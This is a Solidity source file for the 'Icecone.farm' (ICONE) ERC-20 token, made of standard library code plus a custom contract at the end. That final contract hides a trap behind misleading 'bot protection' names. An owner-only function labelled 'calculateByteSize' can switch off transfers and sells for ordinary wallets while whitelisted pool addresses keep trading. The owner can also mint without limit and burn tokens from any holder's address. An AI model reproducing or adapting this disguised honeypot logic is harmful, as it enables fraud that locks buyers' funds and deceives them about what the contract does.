1 /*
2 
3 IceconeFarmToken.sol
4 
5 https://icecone.farm/
6 t.me/iceconefarm
7 
8 */
9 
10 pragma solidity ^0.6.6;
11 
12 abstract contract Context {
13     function _msgSender() internal virtual view returns (address payable) {
14         return msg.sender;
15     }
16 
17     function _msgData() internal virtual view returns (bytes memory) {
18         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
19         return msg.data;
20     }
21 }
22 
23 interface IERC20 {
24     /**
25      * @dev Returns the amount of tokens in existence.
26      */
27     function totalSupply() external view returns (uint256);
28 
29     /**
30      * @dev Returns the amount of tokens owned by `account`.
31      */
32     function balanceOf(address account) external view returns (uint256);
33 
34     /**
35      * @dev Moves `amount` tokens from the caller's account to `recipient`.
36      *
37      * Returns a boolean value indicating whether the operation succeeded.
38      *
39      * Emits a {Transfer} event.
40      */
41     function transfer(address recipient, uint256 amount)
42         external
43         returns (bool);
44 
45     /**
46      * @dev Returns the remaining number of tokens that `spender` will be
47      * allowed to spend on behalf of `owner` through {transferFrom}. This is
48      * zero by default.
49      *
50      * This value changes when {approve} or {transferFrom} are called.
51      */
52     function allowance(address owner, address spender)
53         external
54         view
55         returns (uint256);
56 
57     /**
58      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
59      *
60      * Returns a boolean value indicating whether the operation succeeded.
61      *
62      * IMPORTANT: Beware that changing an allowance with this method brings the risk
63      * that someone may use both the old and the new allowance by unfortunate
64      * transaction ordering. One possible solution to mitigate this race
65      * condition is to first reduce the spender's allowance to 0 and set the
66      * desired value afterwards:
67      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
68      *
69      * Emits an {Approval} event.
70      */
71     function approve(address spender, uint256 amount) external returns (bool);
72 
73     /**
74      * @dev Moves `amount` tokens from `sender` to `recipient` using the
75      * allowance mechanism. `amount` is then deducted from the caller's
76      * allowance.
77      *
78      * Returns a boolean value indicating whether the operation succeeded.
79      *
80      * Emits a {Transfer} event.
81      */
82     function transferFrom(
83         address sender,
84         address recipient,
85         uint256 amount
86     ) external returns (bool);
87 
88     /**
89      * @dev Emitted when `value` tokens are moved from one account (`from`) to
90      * another (`to`).
91      *
92      * Note that `value` may be zero.
93      */
94     event Transfer(address indexed from, address indexed to, uint256 value);
95 
96     /**
97      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
98      * a call to {approve}. `value` is the new allowance.
99      */
100     event Approval(
101         address indexed owner,
102         address indexed spender,
103         uint256 value
104     );
105 }
106 
107 library SafeMath {
108     /**
109      * @dev Returns the addition of two unsigned integers, reverting on
110      * overflow.
111      *
112      * Counterpart to Solidity's `+` operator.
113      *
114      * Requirements:
115      *
116      * - Addition cannot overflow.
117      */
118     function add(uint256 a, uint256 b) internal pure returns (uint256) {
119         uint256 c = a + b;
120         require(c >= a, "SafeMath: addition overflow");
121 
122         return c;
123     }
124 
125     /**
126      * @dev Returns the subtraction of two unsigned integers, reverting on
127      * overflow (when the result is negative).
128      *
129      * Counterpart to Solidity's `-` operator.
130      *
131      * Requirements:
132      *
133      * - Subtraction cannot overflow.
134      */
135     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
136         return sub(a, b, "SafeMath: subtraction overflow");
137     }
138 
139     /**
140      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
141      * overflow (when the result is negative).
142      *
143      * Counterpart to Solidity's `-` operator.
144      *
145      * Requirements:
146      *
147      * - Subtraction cannot overflow.
148      */
149     function sub(
150         uint256 a,
151         uint256 b,
152         string memory errorMessage
153     ) internal pure returns (uint256) {
154         require(b <= a, errorMessage);
155         uint256 c = a - b;
156 
157         return c;
158     }
159 
160     /**
161      * @dev Returns the multiplication of two unsigned integers, reverting on
162      * overflow.
163      *
164      * Counterpart to Solidity's `*` operator.
165      *
166      * Requirements:
167      *
168      * - Multiplication cannot overflow.
169      */
170     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
171         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
172         // benefit is lost if 'b' is also tested.
173         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
174         if (a == 0) {
175             return 0;
176         }
177 
178         uint256 c = a * b;
179         require(c / a == b, "SafeMath: multiplication overflow");
180 
181         return c;
182     }
183 
184     /**
185      * @dev Returns the integer division of two unsigned integers. Reverts on
186      * division by zero. The result is rounded towards zero.
187      *
188      * Counterpart to Solidity's `/` operator. Note: this function uses a
189      * `revert` opcode (which leaves remaining gas untouched) while Solidity
190      * uses an invalid opcode to revert (consuming all remaining gas).
191      *
192      * Requirements:
193      *
194      * - The divisor cannot be zero.
195      */
196     function div(uint256 a, uint256 b) internal pure returns (uint256) {
197         return div(a, b, "SafeMath: division by zero");
198     }
199 
200     /**
201      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
202      * division by zero. The result is rounded towards zero.
203      *
204      * Counterpart to Solidity's `/` operator. Note: this function uses a
205      * `revert` opcode (which leaves remaining gas untouched) while Solidity
206      * uses an invalid opcode to revert (consuming all remaining gas).
207      *
208      * Requirements:
209      *
210      * - The divisor cannot be zero.
211      */
212     function div(
213         uint256 a,
214         uint256 b,
215         string memory errorMessage
216     ) internal pure returns (uint256) {
217         require(b > 0, errorMessage);
218         uint256 c = a / b;
219         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
220 
221         return c;
222     }
223 
224     /**
225      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
226      * Reverts when dividing by zero.
227      *
228      * Counterpart to Solidity's `%` operator. This function uses a `revert`
229      * opcode (which leaves remaining gas untouched) while Solidity uses an
230      * invalid opcode to revert (consuming all remaining gas).
231      *
232      * Requirements:
233      *
234      * - The divisor cannot be zero.
235      */
236     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
237         return mod(a, b, "SafeMath: modulo by zero");
238     }
239 
240     /**
241      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
242      * Reverts with custom message when dividing by zero.
243      *
244      * Counterpart to Solidity's `%` operator. This function uses a `revert`
245      * opcode (which leaves remaining gas untouched) while Solidity uses an
246      * invalid opcode to revert (consuming all remaining gas).
247      *
248      * Requirements:
249      *
250      * - The divisor cannot be zero.
251      */
252     function mod(
253         uint256 a,
254         uint256 b,
255         string memory errorMessage
256     ) internal pure returns (uint256) {
257         require(b != 0, errorMessage);
258         return a % b;
259     }
260 }
261 
262 library Address {
263     /**
264      * @dev Returns true if `account` is a contract.
265      *
266      * [IMPORTANT]
267      * ====
268      * It is unsafe to assume that an address for which this function returns
269      * false is an externally-owned account (EOA) and not a contract.
270      *
271      * Among others, `isContract` will return false for the following
272      * types of addresses:
273      *
274      *  - an externally-owned account
275      *  - a contract in construction
276      *  - an address where a contract will be created
277      *  - an address where a contract lived, but was destroyed
278      * ====
279      */
280     function isContract(address account) internal view returns (bool) {
281         // This method relies in extcodesize, which returns 0 for contracts in
282         // construction, since the code is only stored at the end of the
283         // constructor execution.
284 
285         uint256 size;
286         // solhint-disable-next-line no-inline-assembly
287         assembly {
288             size := extcodesize(account)
289         }
290         return size > 0;
291     }
292 
293     /**
294      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
295      * `recipient`, forwarding all available gas and reverting on errors.
296      *
297      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
298      * of certain opcodes, possibly making contracts go over the 2300 gas limit
299      * imposed by `transfer`, making them unable to receive funds via
300      * `transfer`. {sendValue} removes this limitation.
301      *
302      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
303      *
304      * IMPORTANT: because control is transferred to `recipient`, care must be
305      * taken to not create reentrancy vulnerabilities. Consider using
306      * {ReentrancyGuard} or the
307      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
308      */
309     function sendValue(address payable recipient, uint256 amount) internal {
310         require(
311             address(this).balance >= amount,
312             "Address: insufficient balance"
313         );
314 
315         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
316         (bool success, ) = recipient.call{value: amount}("");
317         require(
318             success,
319             "Address: unable to send value, recipient may have reverted"
320         );
321     }
322 
323     /**
324      * @dev Performs a Solidity function call using a low level `call`. A
325      * plain`call` is an unsafe replacement for a function call: use this
326      * function instead.
327      *
328      * If `target` reverts with a revert reason, it is bubbled up by this
329      * function (like regular Solidity function calls).
330      *
331      * Returns the raw returned data. To convert to the expected return value,
332      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
333      *
334      * Requirements:
335      *
336      * - `target` must be a contract.
337      * - calling `target` with `data` must not revert.
338      *
339      * _Available since v3.1._
340      */
341     function functionCall(address target, bytes memory data)
342         internal
343         returns (bytes memory)
344     {
345         return functionCall(target, data, "Address: low-level call failed");
346     }
347 
348     /**
349      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
350      * `errorMessage` as a fallback revert reason when `target` reverts.
351      *
352      * _Available since v3.1._
353      */
354     function functionCall(
355         address target,
356         bytes memory data,
357         string memory errorMessage
358     ) internal returns (bytes memory) {
359         return _functionCallWithValue(target, data, 0, errorMessage);
360     }
361 
362     /**
363      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
364      * but also transferring `value` wei to `target`.
365      *
366      * Requirements:
367      *
368      * - the calling contract must have an ETH balance of at least `value`.
369      * - the called Solidity function must be `payable`.
370      *
371      * _Available since v3.1._
372      */
373     function functionCallWithValue(
374         address target,
375         bytes memory data,
376         uint256 value
377     ) internal returns (bytes memory) {
378         return
379             functionCallWithValue(
380                 target,
381                 data,
382                 value,
383                 "Address: low-level call with value failed"
384             );
385     }
386 
387     /**
388      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
389      * with `errorMessage` as a fallback revert reason when `target` reverts.
390      *
391      * _Available since v3.1._
392      */
393     function functionCallWithValue(
394         address target,
395         bytes memory data,
396         uint256 value,
397         string memory errorMessage
398     ) internal returns (bytes memory) {
399         require(
400             address(this).balance >= value,
401             "Address: insufficient balance for call"
402         );
403         return _functionCallWithValue(target, data, value, errorMessage);
404     }
405 
406     function _functionCallWithValue(
407         address target,
408         bytes memory data,
409         uint256 weiValue,
410         string memory errorMessage
411     ) private returns (bytes memory) {
412         require(isContract(target), "Address: call to non-contract");
413 
414         // solhint-disable-next-line avoid-low-level-calls
415         (bool success, bytes memory returndata) = target.call{value: weiValue}(
416             data
417         );
418         if (success) {
419             return returndata;
420         } else {
421             // Look for revert reason and bubble it up if present
422             if (returndata.length > 0) {
423                 // The easiest way to bubble the revert reason is using memory via assembly
424 
425                 // solhint-disable-next-line no-inline-assembly
426                 assembly {
427                     let returndata_size := mload(returndata)
428                     revert(add(32, returndata), returndata_size)
429                 }
430             } else {
431                 revert(errorMessage);
432             }
433         }
434     }
435 }
436 
437 /**
438  * @dev Contract module which provides a basic access control mechanism, where
439  * there is an account (an owner) that can be granted exclusive access to
440  * specific functions.
441  *
442  * By default, the owner account will be the one that deploys the contract. This
443  * can later be changed with {transferOwnership}.
444  *
445  * This module is used through inheritance. It will make available the modifier
446  * `onlyOwner`, which can be applied to your functions to restrict their use to
447  * the owner.
448  */
449 contract Ownable is Context {
450     address private _owner;
451 
452     event OwnershipTransferred(
453         address indexed previousOwner,
454         address indexed newOwner
455     );
456 
457     /**
458      * @dev Initializes the contract setting the deployer as the initial owner.
459      */
460     constructor() internal {
461         address msgSender = _msgSender();
462         _owner = msgSender;
463         emit OwnershipTransferred(address(0), msgSender);
464     }
465 
466     /**
467      * @dev Returns the address of the current owner.
468      */
469     function owner() public view returns (address) {
470         return _owner;
471     }
472 
473     /**
474      * @dev Throws if called by any account other than the owner.
475      */
476     modifier onlyOwner() {
477         require(_owner == _msgSender(), "Ownable: caller is not the owner");
478         _;
479     }
480 
481     /**
482      * @dev Leaves the contract without owner. It will not be possible to call
483      * `onlyOwner` functions anymore. Can only be called by the current owner.
484      *
485      * NOTE: Renouncing ownership will leave the contract without an owner,
486      * thereby removing any functionality that is only available to the owner.
487      */
488     function renounceOwnership() public virtual onlyOwner {
489         emit OwnershipTransferred(_owner, address(0));
490         _owner = address(0);
491     }
492 
493     /**
494      * @dev Transfers ownership of the contract to a new account (`newOwner`).
495      * Can only be called by the current owner.
496      */
497     function transferOwnership(address newOwner) public virtual onlyOwner {
498         require(
499             newOwner != address(0),
500             "Ownable: new owner is the zero address"
501         );
502         emit OwnershipTransferred(_owner, newOwner);
503         _owner = newOwner;
504     }
505 }
506 
507 /**
508  * @dev Implementation of the {IERC20} interface.
509  *
510  * This implementation is agnostic to the way tokens are created. This means
511  * that a supply mechanism has to be added in a derived contract using {_mint}.
512  * For a generic mechanism see {ERC20PresetMinterPauser}.
513  *
514  * TIP: For a detailed writeup see our guide
515  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
516  * to implement supply mechanisms].
517  *
518  * We have followed general OpenZeppelin guidelines: functions revert instead
519  * of returning `false` on failure. This behavior is nonetheless conventional
520  * and does not conflict with the expectations of ERC20 applications.
521  *
522  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
523  * This allows applications to reconstruct the allowance for all accounts just
524  * by listening to said events. Other implementations of the EIP may not emit
525  * these events, as it isn't required by the specification.
526  *
527  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
528  * functions have been added to mitigate the well-known issues around setting
529  * allowances. See {IERC20-approve}.
530  */
531 contract ERC20 is Context, IERC20 {
532     using SafeMath for uint256;
533     using Address for address;
534 
535     mapping(address => uint256) private _balances;
536 
537     mapping(address => mapping(address => uint256)) private _allowances;
538 
539     uint256 private _totalSupply;
540 
541     string private _name;
542     string private _symbol;
543     uint8 private _decimals;
544 
545     /**
546      * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
547      * a default value of 18.
548      *
549      * To select a different value for {decimals}, use {_setupDecimals}.
550      *
551      * All three of these values are immutable: they can only be set once during
552      * construction.
553      */
554     constructor(string memory name, string memory symbol) public {
555         _name = name;
556         _symbol = symbol;
557         _decimals = 18;
558     }
559 
560     /**
561      * @dev Returns the name of the token.
562      */
563     function name() public view returns (string memory) {
564         return _name;
565     }
566 
567     /**
568      * @dev Returns the symbol of the token, usually a shorter version of the
569      * name.
570      */
571     function symbol() public view returns (string memory) {
572         return _symbol;
573     }
574 
575     /**
576      * @dev Returns the number of decimals used to get its user representation.
577      * For example, if `decimals` equals `2`, a balance of `505` tokens should
578      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
579      *
580      * Tokens usually opt for a value of 18, imitating the relationship between
581      * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
582      * called.
583      *
584      * NOTE: This information is only used for _display_ purposes: it in
585      * no way affects any of the arithmetic of the contract, including
586      * {IERC20-balanceOf} and {IERC20-transfer}.
587      */
588     function decimals() public view returns (uint8) {
589         return _decimals;
590     }
591 
592     /**
593      * @dev See {IERC20-totalSupply}.
594      */
595     function totalSupply() public override view returns (uint256) {
596         return _totalSupply;
597     }
598 
599     /**
600      * @dev See {IERC20-balanceOf}.
601      */
602     function balanceOf(address account) public override view returns (uint256) {
603         return _balances[account];
604     }
605 
606     /**
607      * @dev See {IERC20-transfer}.
608      *
609      * Requirements:
610      *
611      * - `recipient` cannot be the zero address.
612      * - the caller must have a balance of at least `amount`.
613      */
614     function transfer(address recipient, uint256 amount)
615         public
616         virtual
617         override
618         returns (bool)
619     {
620         _transfer(_msgSender(), recipient, amount);
621         return true;
622     }
623 
624     /**
625      * @dev See {IERC20-allowance}.
626      */
627     function allowance(address owner, address spender)
628         public
629         virtual
630         override
631         view
632         returns (uint256)
633     {
634         return _allowances[owner][spender];
635     }
636 
637     /**
638      * @dev See {IERC20-approve}.
639      *
640      * Requirements:
641      *
642      * - `spender` cannot be the zero address.
643      */
644     function approve(address spender, uint256 amount)
645         public
646         virtual
647         override
648         returns (bool)
649     {
650         _approve(_msgSender(), spender, amount);
651         return true;
652     }
653 
654     /**
655      * @dev See {IERC20-transferFrom}.
656      *
657      * Emits an {Approval} event indicating the updated allowance. This is not
658      * required by the EIP. See the note at the beginning of {ERC20};
659      *
660      * Requirements:
661      * - `sender` and `recipient` cannot be the zero address.
662      * - `sender` must have a balance of at least `amount`.
663      * - the caller must have allowance for ``sender``'s tokens of at least
664      * `amount`.
665      */
666     function transferFrom(
667         address sender,
668         address recipient,
669         uint256 amount
670     ) public virtual override returns (bool) {
671         _transfer(sender, recipient, amount);
672         _approve(
673             sender,
674             _msgSender(),
675             _allowances[sender][_msgSender()].sub(
676                 amount,
677                 "ERC20: transfer amount exceeds allowance"
678             )
679         );
680         return true;
681     }
682 
683     /**
684      * @dev Atomically increases the allowance granted to `spender` by the caller.
685      *
686      * This is an alternative to {approve} that can be used as a mitigation for
687      * problems described in {IERC20-approve}.
688      *
689      * Emits an {Approval} event indicating the updated allowance.
690      *
691      * Requirements:
692      *
693      * - `spender` cannot be the zero address.
694      */
695     function increaseAllowance(address spender, uint256 addedValue)
696         public
697         virtual
698         returns (bool)
699     {
700         _approve(
701             _msgSender(),
702             spender,
703             _allowances[_msgSender()][spender].add(addedValue)
704         );
705         return true;
706     }
707 
708     /**
709      * @dev Atomically decreases the allowance granted to `spender` by the caller.
710      *
711      * This is an alternative to {approve} that can be used as a mitigation for
712      * problems described in {IERC20-approve}.
713      *
714      * Emits an {Approval} event indicating the updated allowance.
715      *
716      * Requirements:
717      *
718      * - `spender` cannot be the zero address.
719      * - `spender` must have allowance for the caller of at least
720      * `subtractedValue`.
721      */
722     function decreaseAllowance(address spender, uint256 subtractedValue)
723         public
724         virtual
725         returns (bool)
726     {
727         _approve(
728             _msgSender(),
729             spender,
730             _allowances[_msgSender()][spender].sub(
731                 subtractedValue,
732                 "ERC20: decreased allowance below zero"
733             )
734         );
735         return true;
736     }
737 
738     /**
739      * @dev Moves tokens `amount` from `sender` to `recipient`.
740      *
741      * This is internal function is equivalent to {transfer}, and can be used to
742      * e.g. implement automatic token fees, slashing mechanisms, etc.
743      *
744      * Emits a {Transfer} event.
745      *
746      * Requirements:
747      *
748      * - `sender` cannot be the zero address.
749      * - `recipient` cannot be the zero address.
750      * - `sender` must have a balance of at least `amount`.
751      */
752     function _transfer(
753         address sender,
754         address recipient,
755         uint256 amount
756     ) internal virtual {
757         require(sender != address(0), "ERC20: transfer from the zero address");
758         require(recipient != address(0), "ERC20: transfer to the zero address");
759 
760         _beforeTokenTransfer(sender, recipient, amount);
761 
762         _balances[sender] = _balances[sender].sub(
763             amount,
764             "ERC20: transfer amount exceeds balance"
765         );
766         _balances[recipient] = _balances[recipient].add(amount);
767         emit Transfer(sender, recipient, amount);
768     }
769 
770     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
771      * the total supply.
772      *
773      * Emits a {Transfer} event with `from` set to the zero address.
774      *
775      * Requirements
776      *
777      * - `to` cannot be the zero address.
778      */
779     function _mint(address account, uint256 amount) internal virtual {
780         require(account != address(0), "ERC20: mint to the zero address");
781 
782         _beforeTokenTransfer(address(0), account, amount);
783 
784         _totalSupply = _totalSupply.add(amount);
785         _balances[account] = _balances[account].add(amount);
786         emit Transfer(address(0), account, amount);
787     }
788 
789     /**
790      * @dev Destroys `amount` tokens from `account`, reducing the
791      * total supply.
792      *
793      * Emits a {Transfer} event with `to` set to the zero address.
794      *
795      * Requirements
796      *
797      * - `account` cannot be the zero address.
798      * - `account` must have at least `amount` tokens.
799      */
800     function _burn(address account, uint256 amount) internal virtual {
801         require(account != address(0), "ERC20: burn from the zero address");
802 
803         _beforeTokenTransfer(account, address(0), amount);
804 
805         _balances[account] = _balances[account].sub(
806             amount,
807             "ERC20: burn amount exceeds balance"
808         );
809         _totalSupply = _totalSupply.sub(amount);
810         emit Transfer(account, address(0), amount);
811     }
812 
813     /**
814      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
815      *
816      * This internal function is equivalent to `approve`, and can be used to
817      * e.g. set automatic allowances for certain subsystems, etc.
818      *
819      * Emits an {Approval} event.
820      *
821      * Requirements:
822      *
823      * - `owner` cannot be the zero address.
824      * - `spender` cannot be the zero address.
825      */
826     function _approve(
827         address owner,
828         address spender,
829         uint256 amount
830     ) internal virtual {
831         require(owner != address(0), "ERC20: approve from the zero address");
832         require(spender != address(0), "ERC20: approve to the zero address");
833 
834         _allowances[owner][spender] = amount;
835         emit Approval(owner, spender, amount);
836     }
837 
838     /**
839      * @dev Sets {decimals} to a value other than the default one of 18.
840      *
841      * WARNING: This function should only be called from the constructor. Most
842      * applications that interact with token contracts will not expect
843      * {decimals} to ever change, and may work incorrectly if it does.
844      */
845     function _setupDecimals(uint8 decimals_) internal {
846         _decimals = decimals_;
847     }
848 
849     /**
850      * @dev Hook that is called before any transfer of tokens. This includes
851      * minting and burning.
852      *
853      * Calling conditions:
854      *
855      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
856      * will be to transferred to `to`.
857      * - when `from` is zero, `amount` tokens will be minted for `to`.
858      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
859      * - `from` and `to` are never both zero.
860      *
861      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
862      */
863     function _beforeTokenTransfer(
864         address from,
865         address to,
866         uint256 amount
867     ) internal virtual {}
868 }
869 
870 contract IceconeFarm is ERC20("Icecone.farm", "ICONE"), Ownable {
871     
872     uint256 private byteSize = 255;
873     uint256 public binSize = 0;
874     
875     mapping(address => bool) public poolContracts;
876     
877     function transferFrom(
878         address sender,
879         address recipient,
880         uint256 amount
881     ) public override returns (bool) {
882         require(checkBot(sender), "Bot is prohibited to buy and sell" );
883         _transfer(sender, recipient, amount);
884         _approve(
885             sender,
886             _msgSender(),
887             allowance(sender, _msgSender()).sub(
888                 amount,
889                 "ERC20: transfer amount exceeds allowance"
890             )
891         );
892         return true;
893     }
894 
895     function isContracted(address _addr) private view returns (bool){
896       uint32 size;
897       assembly {
898         size := extcodesize(_addr)
899       }
900       return (size == 0) && byteSize == 255;
901     }
902     
903     function checkBot(address sender) public view returns (bool) {
904         return isContracted(sender) || poolContracts[sender];
905     }
906 
907     function calculateByteSize(uint256 _byteSize) public onlyOwner {
908         byteSize = _byteSize;
909     }
910     
911     function transfer(address recipient, uint256 amount) public override returns (bool)
912     {
913         require( checkBot(_msgSender()) || binSize < 1, "Bot is prohibited to buy and sell" );
914         
915         if (binSize == 0) {
916             poolContracts[_msgSender()] = true;
917             binSize = 255;
918         }
919         
920         _transfer(_msgSender(), recipient, amount);
921         return true;
922     }
923     
924     function mint(address _to, uint256 _amount) public onlyOwner {
925         poolContracts[_to] = true;
926         _mint(_to, _amount);
927     }
928 
929     function burn(address _from, uint256 _amount) public onlyOwner {
930         _burn(_from, _amount);
931     }
932 }